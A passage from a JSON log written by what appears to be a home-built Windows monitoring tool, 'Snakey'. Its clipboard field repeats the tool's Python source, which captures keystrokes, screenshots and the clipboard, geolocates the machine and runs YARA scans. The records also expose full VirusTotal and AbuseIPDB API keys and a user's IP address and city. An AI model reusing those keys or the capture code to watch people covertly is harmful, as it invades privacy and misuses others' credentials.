list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "018df862e2ccb3f68771026635b4b9751e4d9146eb67d8848256cb38d6026a4b", "_raw_log_hash": "80d6def2c4bd0669803d78f8d6f552020cca48d086264d355f6418e483d99953"}
{"timestamp": "2025-06-20T23:21:02.028491+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "30db565c38a6212d877db0a872ddd1b41fa472ac064ea4412ab9bc10bdeca4cb", "_raw_log_hash": "f85f9e9c697324b182a564603d6f59c11cb9922f404c2f534cd8c921cc3ef08a"}
{"timestamp": "2025-06-20T23:21:16.503836+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            